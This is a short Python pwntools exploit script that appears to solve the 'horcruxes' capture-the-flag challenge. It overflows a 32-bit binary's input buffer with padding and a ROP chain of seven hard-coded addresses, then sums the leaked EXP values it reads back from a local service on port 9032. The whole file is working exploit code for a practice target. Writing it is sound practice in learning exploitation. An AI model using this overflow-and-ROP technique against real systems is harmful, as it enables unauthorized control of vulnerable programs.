import struct
import sys

from pwn import *

context.arch='i386'
context.bits=32
context.terminal=['tmux','splitw','-h']

gdbscript='''
set follow-fork-mode child
b *ropme+0xe0
c
'''

MAIN_PLUS_D8 = 0x809fffc
ropchain = p32(0x809fe4b)
ropchain += p32(0x809fe6a)
ropchain += p32(0x809fe89)
ropchain += p32(0x809fea8)
ropchain += p32(0x809fec7)
ropchain += p32(0x809fee6)
ropchain += p32(0x809ff05)
ropchain += p32(MAIN_PLUS_D8)

# p = process('/home/horcruxes/horcruxes')
p = remote('127.0.0.1', 9032)
# p = gdb.debug('/home/horcruxes/horcruxes', gdbscript)

p.readuntil(b':')
p.sendline(b'0')
p.readuntil(b': ')
p.sendline(b'A'*(0x74 + 4) + ropchain)

answer = 0

for _ in range(7):
  p.readuntil(b'EXP +')
  s = p.readuntil(b')')
  num = s.decode()[:-1]
  print(num)
  answer += int(num)

answer &= 0xffffffff
print('answer: ' + str(answer))

p.interactive()

# [manually type in answer here]
